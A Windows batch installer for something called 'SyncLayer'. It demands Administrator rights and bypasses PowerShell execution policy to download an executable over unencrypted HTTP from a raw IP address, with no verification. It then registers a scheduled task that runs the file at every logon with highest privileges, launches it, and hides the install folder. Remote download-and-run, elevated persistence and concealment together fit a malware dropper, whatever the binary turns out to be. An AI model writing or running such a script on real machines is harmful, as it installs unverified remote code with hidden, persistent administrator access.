@echo off
setlocal EnableExtensions
cd /d "%~dp0"

echo ============================================
echo  SyncLayer ONE-FILE INSTALL
echo ============================================
echo.

net session >nul 2>&1
if errorlevel 1 (
    echo ERROR: Run as Administrator
    pause
    exit /b 1
)

set "DEST=%ProgramFiles%\SyncLayer"
set "EXE=%DEST%\SyncLayer.exe"
set "TASK=SyncLayer"
set "EXE_URL=http://201.51.8.127:8000/static/SyncLayer.exe"
set "TMP_URL=%EXE_URL%"

if not exist "%DEST%" mkdir "%DEST%"

echo [1/3] Downloading SyncLayer.exe
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%TMP_URL%' -OutFile '%EXE%' -UseBasicParsing } catch { exit 1 }"
if errorlevel 1 (
    echo Download failed from default URL:
    echo %TMP_URL%
    echo.
    set /p TMP_URL=Enter server URL to SyncLayer.exe (example http://201.51.8.127:8000/static/SyncLayer.exe): 
    if "%TMP_URL%"=="" (
        echo ERROR: URL is empty
        pause
        exit /b 1
    )
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%TMP_URL%' -OutFile '%EXE%' -UseBasicParsing } catch { exit 1 }"
    if errorlevel 1 (
        echo ERROR: download failed again
        pause
        exit /b 1
    )
)

if not exist "%EXE%" (
    echo ERROR: file not found after download
    pause
    exit /b 1
)

echo [2/3] Creating startup task
schtasks /Create /F /TN "%TASK%" /TR "\"%EXE%\"" /SC ONLOGON /RL HIGHEST /IT >nul
if errorlevel 1 (
    echo ERROR: cannot create task
    pause
    exit /b 1
)

echo [3/3] Starting SyncLayer
start "" "%EXE%"
attrib +h "%DEST%" >nul 2>&1

echo.
echo OK. SyncLayer installed.
echo Dashboard: http://201.51.8.127:8000
echo Wait 1-2 minutes and refresh dashboard.
echo.
pause
exit /b 0
